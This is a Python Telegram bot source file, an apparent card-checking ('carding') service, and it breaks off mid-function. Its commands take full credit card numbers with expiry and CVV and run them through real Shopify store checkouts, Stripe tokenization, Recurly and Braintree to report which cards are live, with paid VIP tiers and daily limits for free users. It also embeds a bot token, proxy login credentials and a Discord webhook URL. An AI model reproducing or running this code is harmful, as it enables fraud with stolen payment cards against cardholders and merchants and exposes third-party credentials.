import telebot,os
import re,json
import requests
import telebot,time,random
import random
import string
from telebot import types
from gatet import *
from reg import reg
from datetime import datetime, timedelta
from faker import Faker
from multiprocessing import Process
import threading
import telebot, random, os, time, requests, re, string, json, urllib3, time, datetime, urllib.parse, asyncio, traceback
from typing import Optional
import xml.etree.ElementTree as ET
from fake_useragent import UserAgent
from faker import Faker
from urllib.parse import urlparse
from bs4 import BeautifulSoup
from time import perf_counter
from validators import url as url_validator
from asyncio import sleep
from random import randint, choice
from string import ascii_letters
from httpx import AsyncClient, Response, RemoteProtocolError, ProxyError, ReadTimeout
fake = Faker()

bot_token = "7111786402:AAFAPBS2T-87Q9jj19N4YljQ6yveLClz2UU"

bot=telebot.TeleBot(bot_token,parse_mode="HTML")

username = "sfdbdksy-rotate"
password = "vwe59ta9j0dm"
proxy = "p.webshare.io:80"
proxy_auth = "{}:{}@{}".format(username, password, proxy)
proxies = {
    "http":"p.webshare.io:80:sfdbdksy-rotate:vwe59ta9j0dm".format(proxy_auth) #http://rp.proxyscrape.com:6060@0vlv3kx7svpm655:rxcvqujk9utaemx
}


#defs

def load_user_ids_from_file(file_path):
    with open(file_path, 'r') as file:
        return [int(line.strip()) for line in file]

UPLOADS_DIR = 'uploads'

os.makedirs(UPLOADS_DIR, exist_ok=True)

AUTHORIZED_USERS_FILE = 'authorized_users.txt'
ADMIN_IDS_FILE = 'admins.txt'
PREMIUM_USERS_FILE = 'authorized_users.txt'
OWNER_USERS_FILE = 'owner_user.txt'
REGISTERED_USERS_FILE = 'registered_users.txt'
BYPASS_USERS_FILE = 'bypassable.txt'

AUTHORIZED_USERS = load_user_ids_from_file(AUTHORIZED_USERS_FILE)
ADMIN_IDS = load_user_ids_from_file(ADMIN_IDS_FILE)
PREMIUM_USERS = load_user_ids_from_file(AUTHORIZED_USERS_FILE)
OWNER_USERS = load_user_ids_from_file(OWNER_USERS_FILE)
REGISTERED_USERS = load_user_ids_from_file(REGISTERED_USERS_FILE)
BYPASS_USERS = load_user_ids_from_file(BYPASS_USERS_FILE)

def save_user_id(user_id):
    with open('all_users.txt', 'a') as file:
        file.write(str(user_id) + '\n')

def is_registered(user_id):
    return user_id in REGISTERED_USERS

def save_user_ids_to_file(file_path, user_ids):
    with open(file_path, 'w') as file:
        for user_id in user_ids:
            file.write(str(user_id) + '\n')

def is_admin(user_id):
    return user_id in ADMIN_IDS

def is_authorized(user_id):
    return user_id in AUTHORIZED_USERS

def get_random_user_agent():
    ua = UserAgent()
    return ua.random

def save_user_id(user_id):
    with open('all_users.txt', 'a') as file:
        file.write(str(user_id) + '\n')

def send_hook(payload):
    requests.post("https://discord.com/api/webhooks/1257591563777871903/ekOsDZ3HP612Au1DO86AbAKYRzhLhbSItFKGC-A4eAQ9TMjrzrmcX2A_aE0R_eZNH4Yq", json=payload)

def capture(text, start, end):
    start_index = text.find(start)
    if start_index == -1:
        return None
    start_index += len(start)
    end_index = text.find(end, start_index)
    if end_index == -1:
        return None
    return text[start_index:end_index]

def load_all_user_ids():
    with open('all_users.txt', 'r') as file:
        return {int(line.strip()) for line in file}

def is_allowed_file(filename):
    allowed_extensions = ['.txt']
    return any(filename.lower().endswith(ext) for ext in allowed_extensions)

def find_between(data, first, last):
    try:
        start = data.index(first) + len(first)

        end = data.index(last, start)

        return data[start:end]

    except ValueError:
        return

def generate_password(length=8):
    characters = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(random.choice(characters) for _ in range(length))

    domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com']
    username = ''.join(random.choice(string.ascii_lowercase) for _ in range(6))
    domain = random.choice(domains)
    email = f"{username}@{domain}"

    return email, password, username

ALL_USERS = set()


#commands


@bot.message_handler(content_types=['new_chat_members'])
def welcome_new_members(message):
    # Iterate through the list of new chat members
    for new_member in message.new_chat_members:
        # Send an attractive welcome message to the chat
        bot.send_message(
            message.chat.id,
            f"🎉 Welcome to the chat, {new_member.first_name}! We're glad you're here! 🌟", reply_to_message_id=message.message_
        )

@bot.message_handler(commands=['lier'])
def handle_lier_command(message):
    # Check if the /lier command is a reply to another message
    if message.reply_to_message:
        # Get the replied person's username or first name
        replied_person_name = message.reply_to_message.from_user.username if message.reply_to_message.from_user.username else message.reply_to_message.from_user.first_name

        # Generate a random percentage between 0 and 100
        random_percentage = random.randint(0, 100)

        # Construct the response message
        response_message = f"@{replied_person_name} is {random_percentage}% liar!"

        # Send the response message to the chat
        bot.send_message(message.chat.id, response_message)
    else:
        # If the /lier command is not a reply, you can send a different message (optional)
        bot.send_message(message.chat.id, "Please use /lier as a reply to a message to specify who is a liar and get a random percentage.")


@bot.message_handler(commands=['url'])
@bot.message_handler(func=lambda message: message.text.lower().startswith('.url'))
def check_gate(message):
    try:
        urls = message.text.split()[1:]
        if not urls:
            bot.send_message(message.chat.id, "NO URLS PROVIDED! KINDLY TYPE YOUR URL AFTER THE /URL COMMAND.")
            return
        for url in urls:
            if url.startswith('http://') or url.startswith('https://'):
                url, gateways, _ = check_gateway(url)
                if gateways:
                    msg = f'''<b>HERE ARE THE GATEWAYS OF YOUR URL : {", ".join(gateways)}</b>'''
                    bot.send_message(message.chat.id, msg)
                else:
                    bot.send_message(message.chat.id, "OOPS ! NO PAYMENT GATEWAY DETECTED. " + url)
            else:
                bot.send_message(message.chat.id, "Invalid URL: " + url + ". Please Provide A Valid URL Starting With 'HTTP' OR 'HTTPS'.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=['cc'])
@bot.message_handler(func=lambda message: message.text.lower().startswith('.cc'))
def handle_cc(message):
    user_id = message.from_user.id
    if user_id in PREMIUM_USERS:
        try:
            cc, mes, ano, cvv = message.text.split()[1].split("|")

            result = stripe(cc, mes, ano, cvv)

            if user_id in OWNER_USERS:
                user_type = "OWNER"
            elif user_id in PREMIUM_USERS:
                user_type = "PREMIUM"

            bot.send_message(message.chat.id, f"{result}\nRole: {user_type}" , reply_to_message_id=message.message_id, parse_mode="Markdown")
        except Exception as e:
            bot.send_message(message.chat.id, " OOPS! WRONG FORMAT ❌KINDLY ENTER IN THIS FORMAT :CREDITCARD NUMBER | DATE | CVV ")
    else:
        bot.send_message(message.chat.id, "SEEMS LIKE YOU ARE NOT A VIP MEMBER ! BUY VIP ACCESS FROM OWNER TO USE THIS GATE.", reply_to_message_id=message.message_id, parse_mode="Markdown")

@bot.message_handler(commands=['sh1'])
def check_cc(message):
    user_id = message.from_user.id
    if user_id in REGISTERED_USERS:
        url = "https://www.tupperware.com/"

        args = message.text.split()[1:]
        if len(args) != 1:
            bot.reply_to(message, "WRONG FORMAT ! USAGE : /sh1 CC NUMBER|DATE|CVV ")
            return
        cc_info = args[0].split('|')
        if len(cc_info) != 4:
            bot.reply_to(message, "Invalid credit card format. Usage: /bal credit_card_number|month|year|cvv")
            return
        card, month, year, cvv = cc_info
        result = asyncio.run(autoshopify(url, card, month, year, cvv))

        if result[0] == "Good_Shopify":
            username = message.from_user.username if message.from_user.username else "Unknown"

            if user_id in OWNER_USERS:
                user_type = f"OWNER"
            elif user_id in PREMIUM_USERS:
                user_type = f"PREMIUM"

            response_message = f"            ✫ 𝘼𝙍𝙅𝙐𝙉𝘼 𝘾𝙃𝙀𝘾𝙆𝙀𝙍 ✫\n\n➥ 𝐂𝐂 -» {card}|{month}|{year}|{cvv}\n➥ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» {result[16]}\n\n➥ 𝐁𝐢𝐧 -» {result[8]} - {result[9]} - {result[12]} - {result[11]}\n➥ 𝐁𝐚𝐧𝐤 -» {result[10]} \n➥ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 -» {result[15]} - {result[13]} - {result[14]}\n\n➥ 𝐓𝐢𝐦𝐞 𝐭𝐚𝐤𝐞𝐧 -» {result[7]}\n➥ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -» {result[6]}\n➥ 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 -» @{username} {user_type}\n➥ 𝐁𝐨𝐭 𝐛𝐲 -» @LakshayFR"
        else:
            response_message = "Error occurred while processing the credit card."
    else:
        bot.send_message(message.chat.id, "You Need To Be A Vip Member To Access This Gate", reply_to_message_id=message.message_id, parse_mode="Markdown")

    bot.reply_to(message, response_message)

@bot.message_handler(commands=['sh2'])
def check_cc(message):
    user_id = message.from_user.id
    if user_id in REGISTERED_USERS:
        url = "https://aloyoga.com/"

        args = message.text.split()[1:]
        if len(args) != 1:
            bot.reply_to(message, "Usage: /sh2 credit_card_number|month|year|cvv")
            return
        cc_info = args[0].split('|')
        if len(cc_info) != 4:
            bot.reply_to(message, "Invalid credit card format. Usage: /bal credit_card_number|month|year|cvv")
            return
        card, month, year, cvv = cc_info
        result = asyncio.run(autoshopify(url, card, month, year, cvv))

        if result[0] == "Good_Shopify":
            username = message.from_user.username if message.from_user.username else "Unknown"

            if user_id in OWNER_USERS:
                user_type = f"OWNER"
            elif user_id in PREMIUM_USERS:
                user_type = f"PREMIUM"

            response_message = f"            ✫ 𝘼𝙍𝙅𝙐𝙉𝘼 𝘾𝙃𝙀𝘾𝙆𝙀𝙍 ✫\n\n➥ 𝐂𝐂 -» {card}|{month}|{year}|{cvv}\n➥ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» {result[16]}\n\n➥ 𝐁𝐢𝐧 -» {result[8]} - {result[9]} - {result[12]} - {result[11]}\n➥ 𝐁𝐚𝐧𝐤 -» {result[10]}\n➥ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 -» {result[15]} - {result[13]} - {result[14]}\n\n➥ 𝐓𝐢𝐦𝐞 𝐭𝐚𝐤𝐞𝐧 -» {result[7]}\n➥ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -» {result[6]}\n➥ 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 -» @@{username} {user_type}\n➥ 𝐁𝐨𝐭 𝐛𝐲 -» @LakshayFR"
        else:
            response_message = "Error occurred while processing the credit card."
    else:
        bot.send_message(message.chat.id, "You Need To Be A Vip Member To Access This Gate", reply_to_message_id=message.message_id, parse_mode="Markdown")

    bot.reply_to(message, response_message)

@bot.message_handler(commands=['sh3'])
def check_cc(message):
    user_id = message.from_user.id
    if user_id in REGISTERED_USERS:
        url = "https://evolvetogether.com/"

        args = message.text.split()[1:]
        if len(args) != 1:
            bot.reply_to(message, "Usage: /sh3 creditcard number|month|year|cvv")
            return
        cc_info = args[0].split('|')
        if len(cc_info) != 4:
            bot.reply_to(message, "Invalid credit card format. Usage: /bal credit_card_number|month|year|cvv")
            return
        card, month, year, cvv = cc_info
        result = asyncio.run(autoshopify(url, card, month, year, cvv))

        if result[0] == "Good_Shopify":
            username = message.from_user.username if message.from_user.username else "Unknown"

            if user_id in OWNER_USERS:
                user_type = f"OWNER"
            elif user_id in PREMIUM_USERS:
                user_type = f"PREMIUM"

            response_message = f"            ✫ 𝘼𝙍𝙅𝙐𝙉𝘼 𝘾𝙃𝙀𝘾𝙆𝙀𝙍 ✫\n\n➥ 𝐂𝐂 -» {card}|{month}|{year}|{cvv}\n➥ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» {result[16]}\n\n➥ 𝐁𝐢𝐧 -» {result[8]} - {result[9]} - {result[12]} - {result[11]}\n➥ 𝐁𝐚𝐧𝐤 -» {result[10]}\n➥ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 -» {result[15]} - {result[13]} - {result[14]}\n\n➥ 𝐓𝐢𝐦𝐞 𝐭𝐚𝐤𝐞𝐧 -» {result[7]}\n➥ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -» {result[6]}\n➥ 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 -» @{username} {user_type}\n➥ 𝐁𝐨𝐭 𝐛𝐲 -» @LakshayFR"
        else:
            response_message = "Error occurred while processing the credit card."
    else:
        bot.send_message(message.chat.id, "You Need To Be A Vip Member To Access This Gate", reply_to_message_id=message.message_id, parse_mode="Markdown")

    bot.reply_to(message, response_message)

@bot.message_handler(commands=['sh4'])
def check_cc(message):
    user_id = message.from_user.id
    if user_id in REGISTERED_USERS:
        url = "https://bcbg.com/"

        args = message.text.split()[1:]
        if len(args) != 1:
            bot.reply_to(message, "Usage: /sh4 credit_card_number|month|year|cvv")
            return
        cc_info = args[0].split('|')
        if len(cc_info) != 4:
            bot.reply_to(message, "Invalid credit card format. Usage: /bal <credit_card_number|month|year|cvv>")
            return
        card, month, year, cvv = cc_info
        result = asyncio.run(autoshopify(url, card, month, year, cvv))

        if result[0] == "Good_Shopify":
            username = message.from_user.username if message.from_user.username else "Unknown"

            if user_id in OWNER_USERS:
                user_type = f"OWNER"
            elif user_id in PREMIUM_USERS:
                user_type = f"PREMIUM"

            response_message = f"<b>            ✫ 𝘼𝙍𝙅𝙐𝙉𝘼 𝘾𝙃𝙀𝘾𝙆𝙀𝙍 ✫\n\n➥ 𝐂𝐂 -» {card}|{month}|{year}|{cvv}\n➥ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» {result[16]}\n\n➥ 𝐁𝐢𝐧 -» {result[8]} - {result[9]} - {result[12]} - {result[11]}\n➥ 𝐁𝐚𝐧𝐤 -» {result[10]}\n➥ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 -» {result[15]} - {result[13]} - {result[14]}\n\n➥ 𝐓𝐢𝐦𝐞 𝐭𝐚𝐤𝐞𝐧 -» {result[7]}\n➥ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -» {result[6]}\n➥ 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 -» @{username} {user_type}\n➥ 𝐁𝐨𝐭 𝐛𝐲 -» @LakshayFR </b>"
        else:
            response_message = "Sorry ❌\n An Error Occurred While Processing The Credit Card."
    else:
        bot.send_message(message.chat.id, "You Need To Be A Vip Member To Access This Gate", reply_to_message_id=message.message_id, parse_mode="Markdown")

    bot.reply_to(message, response_message)

@bot.message_handler(commands=['sh5'])
def check_cc(message):
    user_id = message.from_user.id
    if user_id in REGISTERED_USERS:
        url = "https://godisdope.com/"

        args = message.text.split()[1:]
        if len(args) != 1:
            bot.reply_to(message, "Usage: /sh5 credit_card_number|month|year|cvv")
            return
        cc_info = args[0].split('|')
        if len(cc_info) != 4:
            bot.reply_to(message, "Invalid credit card format. Usage: /bal credit_card_number|month|year|cvv")
            return
        card, month, year, cvv = cc_info
        result = asyncio.run(autoshopify(url, card, month, year, cvv))

        if result[0] == "Good_Shopify":
            username = message.from_user.username if message.from_user.username else "Unknown"

            if user_id in OWNER_USERS:
                user_type = f"OWNER"
            elif user_id in PREMIUM_USERS:
                user_type = f"PREMIUM"

            response_message = f"            ✫ 𝘼𝙍𝙅𝙐𝙉𝘼 𝘾𝙃𝙀𝘾𝙆𝙀𝙍 ✫\n\n➥ 𝐂𝐂 -» {card}|{month}|{year}|{cvv}\n➥ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» {result[16]}\n\n➥ 𝐁𝐢𝐧 -» {result[8]} - {result[9]} - {result[12]} - {result[11]}\n➥ 𝐁𝐚𝐧𝐤 -» {result[10]} 🏛\n➥ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 -» {result[15]} - {result[13]} - {result[14]}\n\n➥ 𝐓𝐢𝐦𝐞 𝐭𝐚𝐤𝐞𝐧 -» {result[7]}\n➥ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -» {result[6]}\n➥ 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 -» @@{username} {user_type}\n➥ 𝐁𝐨𝐭 𝐛𝐲 -» @LakshayFR"
        else:
            response_message = "Error occurred while processing the credit card."
    else:
        bot.send_message(message.chat.id, "You Need To Be A Vip Member To Access This Gate", reply_to_message_id=message.message_id, parse_mode="Markdown")

    bot.reply_to(message, response_message)

@bot.message_handler(commands=['sh6'])
def check_cc(message):
    user_id = message.from_user.id
    if user_id in REGISTERED_USERS:
        url = "https://kerusso.com/"

        args = message.text.split()[1:]
        if len(args) != 1:
            bot.reply_to(message, "Usage: /sh6 credit_card_number|month|year|cvv")
            return
        cc_info = args[0].split('|')
        if len(cc_info) != 4:
            bot.reply_to(message, "Invalid credit card format. Usage: /bal <credit_card_number|month|year|cvv>")
            return
        card, month, year, cvv = cc_info
        result = asyncio.run(autoshopify(url, card, month, year, cvv))

        if result[0] == "Good_Shopify":
            username = message.from_user.username if message.from_user.username else "Unknown"

            if user_id in OWNER_USERS:
                user_type = f"OWNER"
            elif user_id in PREMIUM_USERS:
                user_type = f"PREMIUM"

            response_message = f"            ✫ 𝘼𝙍𝙅𝙐𝙉𝘼 𝘾𝙃𝙀𝘾𝙆𝙀𝙍 ✫\n\n➥ 𝐂𝐂 -» {card}|{month}|{year}|{cvv}\n➥ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» {result[16]}\n\n➥ 𝐁𝐢𝐧 -» {result[8]} - {result[9]} - {result[12]} - {result[11]}\n➥ 𝐁𝐚𝐧𝐤 -» {result[10]}\n➥ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 -» {result[15]} - {result[13]} - {result[14]}\n\n➥ 𝐓𝐢𝐦𝐞 𝐭𝐚𝐤𝐞𝐧 -» {result[7]}\n➥ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -» {result[6]}\n➥ 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 -» @{username} {user_type}\n➥ 𝐁𝐨𝐭 𝐛𝐲 -» @LakshayFR"
        else:
            response_message = "Error occurred while processing the credit card."
    else:
        bot.send_message(message.chat.id, "You Need To Be A Vip Member To Access This Gate", reply_to_message_id=message.message_id, parse_mode="Markdown")

    bot.reply_to(message, response_message)

@bot.message_handler(commands=['sh7'])
def check_cc(message):
    user_id = message.from_user.id
    if user_id in REGISTERED_USERS:
        url = "https://thesicshop.com/"

        args = message.text.split()[1:]
        if len(args) != 1:
            bot.reply_to(message, "Usage: /sh7 <credit_card_number|month|year|cvv>")
            return
        cc_info = args[0].split('|')
        if len(cc_info) != 4:
            bot.reply_to(message, "Invalid credit card format. Usage: /bal credit_card_number|month|year|cvv")
            return
        card, month, year, cvv = cc_info
        result = asyncio.run(autoshopify(url, card, month, year, cvv))

        if result[0] == "Good_Shopify":
            username = message.from_user.username if message.from_user.username else "Unknown"

            if user_id in OWNER_USERS:
                user_type = f"OWNER"
            elif user_id in PREMIUM_USERS:
                user_type = f"PREMIUM"

            response_message = f"            ✫ 𝘼𝙍𝙅𝙐𝙉𝘼 𝘾𝙃𝙀𝘾𝙆𝙀𝙍 ✫\n\n➥ 𝐂𝐂 -» {card}|{month}|{year}|{cvv}\n➥ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» {result[16]}\n\n➥ 𝐁𝐢𝐧 -» {result[8]} - {result[9]} - {result[12]} - {result[11]}\n➥ 𝐁𝐚𝐧𝐤 -» {result[10]}\n➥ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 -» {result[15]} - {result[13]} - {result[14]}\n\n➥ 𝐓𝐢𝐦𝐞 𝐭𝐚𝐤𝐞𝐧 -» {result[7]}\n➥ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -» {result[6]}\n➥ 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 -» @{username} {user_type}\n➥ 𝐁𝐨𝐭 𝐛𝐲 -» @LakshayFR"
        else:
            response_message = "Error occurred while processing the credit card."
    else:
        bot.send_message(message.chat.id, "You Need To Be A Vip Member To Access This Gate", reply_to_message_id=message.message_id, parse_mode="Markdown")

    bot.reply_to(message, response_message)

@bot.message_handler(commands=['sh8'])
def check_cc(message):
    user_id = message.from_user.id
    if user_id in REGISTERED_USERS:
        url = "https://www.petsense.com/"

        args = message.text.split()[1:]
        if len(args) != 1:
            bot.reply_to(message, "Usage: /sh8 credit_card_number|month|year|cvv")
            return
        cc_info = args[0].split('|')
        if len(cc_info) != 4:
            bot.reply_to(message, "Invalid credit card format. Usage: /bal <credit_card_number|month|year|cvv>")
            return
        card, month, year, cvv = cc_info
        result = asyncio.run(autoshopify(url, card, month, year, cvv))

        if result[0] == "Good_Shopify":
            username = message.from_user.username if message.from_user.username else "Unknown"

            if user_id in OWNER_USERS:
                user_type = f"OWNER"
            elif user_id in PREMIUM_USERS:
                user_type = f"PREMIUM"

            response_message = f"            ✫ 𝘼𝙍𝙅𝙐𝙉𝘼 𝘾𝙃𝙀𝘾𝙆𝙀𝙍 ✫\n\n➥ 𝐂𝐂 -» {card}|{month}|{year}|{cvv}\n➥ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» {result[16]}\n\n➥ 𝐁𝐢𝐧 -» {result[8]} - {result[9]} - {result[12]} - {result[11]}\n➥ 𝐁𝐚𝐧𝐤 -» {result[10]} 🏛\n➥ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 -» {result[15]} - {result[13]} - {result[14]}\n\n➥ 𝐓𝐢𝐦𝐞 𝐭𝐚𝐤𝐞𝐧 -» {result[7]}\n➥ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -» {result[6]}\n➥ 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 -» @{username} {user_type}\n➥ 𝐁𝐨𝐭 𝐛𝐲 -» @LakshayFR"
        else:
            response_message = "Error occurred while processing the credit card."
    else:
        bot.send_message(message.chat.id, "You Need To Be A Vip Member To Access This Gate", reply_to_message_id=message.message_id, parse_mode="Markdown")

    bot.reply_to(message, response_message)

@bot.message_handler(commands=['sh9'])
def check_cc(message):
    user_id = message.from_user.id
    if user_id in REGISTERED_USERS:
        url = "https://us.blochworld.com/"

        args = message.text.split()[1:]
        if len(args) != 1:
            bot.reply_to(message, "Usage: /sh9 credit_card_number|month|year|cvv")
            return
        cc_info = args[0].split('|')
        if len(cc_info) != 4:
            bot.reply_to(message, "Invalid credit card format. Usage: /bal credit_card_number|month|year|cvv")
            return
        card, month, year, cvv = cc_info
        result = asyncio.run(autoshopify(url, card, month, year, cvv))

        if result[0] == "Good_Shopify":
            username = message.from_user.username if message.from_user.username else "Unknown"

            if user_id in OWNER_USERS:
                user_type = f"OWNER"
            elif user_id in PREMIUM_USERS:
                user_type = f"PREMIUM"

            response_message = f"            ✫ 𝘼𝙍𝙅𝙐𝙉𝘼 𝘾𝙃𝙀𝘾𝙆𝙀𝙍 ✫\n\n➥ 𝐂𝐂 -» {card}|{month}|{year}|{cvv}\n➥  𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» {result[16]}\n\n➥ 𝐁𝐢𝐧 -» {result[8]} - {result[9]} - {result[12]} - {result[11]}\n➥ 𝐁𝐚𝐧𝐤 -» {result[10]}\n➥ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 -» {result[15]} - {result[13]} - {result[14]}\n\n➥ 𝐓𝐢𝐦𝐞 𝐭𝐚𝐤𝐞𝐧 -» {result[7]}\n➥ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -» {result[6]}\n➥ 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 -» @{username} {user_type}\n➥ 𝐁𝐨𝐭 𝐛𝐲 -» @LakshayFR"
        else:
            response_message = "Error occurred while processing the credit card."
    else:
        bot.send_message(message.chat.id, "You Need To Be A Vip Member To Access This Gate", reply_to_message_id=message.message_id, parse_mode="Markdown")

    bot.reply_to(message, response_message)

@bot.message_handler(commands=['pp'])
@bot.message_handler(func=lambda message: message.text.lower().startswith('.pp'))
def handle_cc(message):
    user_id = message.from_user.id
    if user_id in PREMIUM_USERS:
        try:
            cc, mes, ano, cvv = message.text.split()[1].split("|")

            result = stripe2(cc, mes, ano, cvv)

            if user_id in OWNER_USERS:
                user_type = "OWNER"
            elif user_id in PREMIUM_USERS:
                user_type = "PREMIUM"

            bot.send_message(message.chat.id, f"{result}\nRole:{user_type}" , reply_to_message_id=message.message_id, parse_mode="Markdown")
        except Exception as e:
            bot.send_message(message.chat.id, f"Please enter like this : /pp credit_card_number|expiration_month|expiration_year|cvv")
    else:
        bot.send_message(message.chat.id, "SEEMS LIKE YOU ARE NOT A MAGICIAN ! BUY VIP ACCESS FROM OWNER TO USE THIS GATE.", reply_to_message_id=message.message_id, parse_mode="Markdown")

@bot.message_handler(commands=['rc'])
@bot.message_handler(func=lambda message: message.text.lower().startswith('.rc'))
def handle_cc(message):
    user_id = message.from_user.id
    if user_id in PREMIUM_USERS:
        try:
            cc, mes, ano, cvv = message.text.split()[1].split("|")

            result = recurly(cc, mes, ano, cvv)

            if user_id in OWNER_USERS:
                user_type = "OWNER"
            elif user_id in PREMIUM_USERS:
                user_type = "PREMIUM"

            bot.send_message(message.chat.id, f"{result}\nRole:{user_type}" , reply_to_message_id=message.message_id, parse_mode="Markdown")
        except Exception as e:
            bot.send_message(message.chat.id, f"GATE IS ON MAINTENANCE")
    else:
        bot.send_message(message.chat.id, "SEEMS LIKE YOU ARE NOT A MAGICIAN ! BUY VIP ACCESS FROM OWNER TO USE THIS GATE.", reply_to_message_id=message.message_id, parse_mode="Markdown")

@bot.message_handler(commands=['b3'])
@bot.message_handler(func=lambda message: message.text.lower().startswith('.rc'))
def handle_cc(message):
    user_id = message.from_user.id
    if user_id in PREMIUM_USERS:
        try:
            cc, mes, ano, cvv = message.text.split()[1].split("|")

            result = b3(cc, mes, ano, cvv)

            if user_id in OWNER_USERS:
                user_type = "OWNER"
            elif user_id in PREMIUM_USERS:
                user_type = "PREMIUM"

            bot.send_message(message.chat.id, f"{result}\nRole:{user_type}" , reply_to_message_id=message.message_id, parse_mode="Markdown")
        except Exception as e:
            bot.send_message(message.chat.id, f"Please enter like this : /rc <credit_card_number>|<expiration_month>|<expiration_year>|<cvv>")
    else:
        bot.send_message(message.chat.id, "SEEMS LIKE YOU ARE NOT A MAGICIAN ! BUY VIP ACCESS FROM OWNER TO USE THIS GATE.", reply_to_message_id=message.message_id, parse_mode="Markdown")

last_hq_time = {}
cc_count = {}

@bot.message_handler(commands=['hq'])
@bot.message_handler(func=lambda message: message.text.lower().startswith('.hq'))
def handle_cc(message):
    user_id = message.from_user.id
    current_time = time.time()

    if user_id not in OWNER_USERS and user_id not in PREMIUM_USERS:
        if user_id in last_hq_time and current_time - last_hq_time[user_id] < 86400:
            bot.send_message(message.chat.id, "OOPS ❌\nDAILY LIMIT REACHED,YOU CAN'T CHECK MORE CARDS\nCONTACT @LAKSHAYFR TO BUY VIP ACCESS\n", reply_to_message_id=message.message_id, parse_mode="Markdown")
            return

    if user_id not in OWNER_USERS and user_id not in PREMIUM_USERS:
        if user_id in cc_count and cc_count[user_id] >= 25:
            bot.send_message(message.chat.id, "OOPS ❌\nDAILY LIMIT REACHED,YOU CAN'T CHECK MORE CARDS\nCONTACT @LAKSHAYFR TO BUY VIP ACCESS\n", reply_to_message_id=message.message_id, parse_mode="Markdown")
            last_hq_time[user_id] = current_time
            return

    if user_id not in OWNER_USERS and user_id not in PREMIUM_USERS:
        if user_id in last_hq_time and current_time - last_hq_time[user_id] < 30:
            remaining_time = 30 - int(current_time - last_hq_time[user_id])
            bot.send_message(message.chat.id, f"Please wait {remaining_time} seconds before using /hq again.", reply_to_message_id=message.message_id, parse_mode="Markdown")
            return

    if user_id in REGISTERED_USERS:
        try:
            cc, mes, ano, cvv = message.text.split()[1].split("|")

            result = stripe3(cc, mes, ano, cvv)

            if user_id in OWNER_USERS:
                user_type = "OWNER"
            elif user_id in PREMIUM_USERS:
                user_type = "PREMIUM"
            else:
                user_type = "〚𝘍𝘙𝘌𝘌〛"
            message_text = f"{result}\nRole:{user_type}"

            bot.send_message(message.chat.id, message_text, reply_to_message_id=message.message_id, parse_mode="Markdown")

            cc_count[user_id] = cc_count.get(user_id, 0) + 1

            last_hq_time[user_id] = current_time
        except Exception as e:
            bot.send_message(message.chat.id, f"Please enter like this : /hq credit_card_number|expiration_month|expiration_year|cvv")
    else:
        bot.send_message(message.chat.id, "SEEMS LIKE YOU ARE NOT REGISTERED, USE /register TO START YOUR JOURNEY.", reply_to_message_id=message.message_id, parse_mode="Markdown")

def tokenize_credit_card(card_number, exp_month, exp_year, cvc, publishable_key):
    try:
        headers = {
            "Authorization": f"Bearer {publishable_key}",
            "Content-Type": "application/x-www-form-urlencoded"
        }

        data = {
            "card[number]": card_number,
            "card[exp_month]": exp_month,
            "card[exp_year]": exp_year,
            "card[cvc]": cvc
        }

        response = requests.post("https://api.stripe.com/v1/tokens", headers=headers, data=data)

        if response.status_code == 200:
            return response.json()["id"]
        else:
            print(f"Error: {response.json()['error']['message']}")
            return None
    except Exception as e:
        print(f"Unexpected error: {str(e)}")
        return None

def pm_credit_card(card_number, exp_month, exp_year, cvc, publishable_key):
    try:
        headers = {
            "Authorization": f"Bearer {publishable_key}",
            "Content-Type": "application/x-www-form-urlencoded"
        }

        data = {
            'type': 'card',
            'card[number]': card_number,
            'card[exp_month]': exp_month,
            'card[exp_year]': exp_year,
            'card[cvc]': cvc,
        }

        # Encode the data in the appropriate format
        encoded_data = urllib.parse.urlencode(data)

        response = requests.post("https://api.stripe.com/v1/payment_methods", headers=headers, data=encoded_data)

        if response.status_code == 200:
            return response.json()["id"]
        else:
            print(f"Error: {response.json()['error']['message']}")
            return None
    except Exception as e:
        print(f"Unexpected error: {str(e)}")
        return None

@bot.message_handler(commands=['pmk'])
@bot.message_handler(func=lambda message: message.text.lower().startswith('.pmk'))
def handle_cc(message):
    user_id = message.from_user.id
    if user_id in REGISTERED_USERS:
        try:
            params = message.text.split()
            publishable_key = message.text.split()[1]
            cc_info = params[2].split('|')
